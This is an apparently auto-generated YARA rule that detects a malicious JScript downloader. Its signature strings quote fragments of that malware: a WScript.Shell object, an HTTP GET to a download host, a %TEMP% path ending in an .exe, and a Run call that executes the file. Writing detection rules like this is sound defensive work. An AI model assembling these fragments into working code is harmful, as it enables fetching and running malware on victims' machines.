rule sig_20160328_7acf1fa29185a77f7664839326a475d8 {
  meta:
    description = "datamaliciousorder - file 20160328_7acf1fa29185a77f7664839326a475d8.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "86e56baf5575c626055a90bd0066e608482ecec644c024c49c61c97de9388d25"

  strings:
    $s1  = "function Apnowj() {return Ygbtklouyc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"HxopwL3LTy.exe\";};" fullword ascii
    $s2  = "Hbtnbfjt[Pvyhvm](\"GET\", \"http://gydkym.com/dk3s8sja\", false);" fullword ascii
    $s3  = "do {WScript[Zbfosifyxw](Twbzkeipp() * 11)} while (Hbtnbfjt[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Ygbtklouyc = function Vfxijria() {return WScript[Pypwkcjvxj](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Slmrttpph(Txonjhrnc, Wphfdqtw){return Txonjhrnc - Wphfdqtw;};" fullword ascii
    $s6  = "function Vqsinbu() {return ((Hifojxbn == true) && (Hifojxbn == Wvrwk)) ? 1 : Qqmmjxya;};" fullword ascii
    $s7  = "function Peqpecmq(Ephwu){Ygbtklouyc[\"Run\"](Ephwu, Qqmmjxya, Qqmmjxya);};" fullword ascii
    $s8  = " while (Uhdrnbnpx){" fullword ascii
    $s9  = "Wvrwk = true; " fullword ascii
    $s10 = "var Scwjuun = false;" fullword ascii
    $s11 = "Hifojxbn = true; " fullword ascii
    $s12 = "return Slmrttpph(Iuqmmxdys, Ivtrv);" fullword ascii
    $s13 = "function Uqqqwoiagw(Velmd) {var Igmbcevg = (1, 2, 3, 4, 5, Velmd); return Igmbcevg;};" fullword ascii
    $s14 = "function Twbzkeipp(){return 22;};" fullword ascii
    $s15 = "var Wvrwk = false;" fullword ascii
    $s16 = "function Ocblg(){return Ygxnmwz;};" fullword ascii
    $s17 = "function Hslpdlpcbq()" fullword ascii
    $s18 = "var Hifojxbn = false;" fullword ascii
    $s19 = "function Pfsua(){return Pypwkcjvxj;};" fullword ascii
    $s20 = "var Xxlzbhqup = new this[\"Date\"]();" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}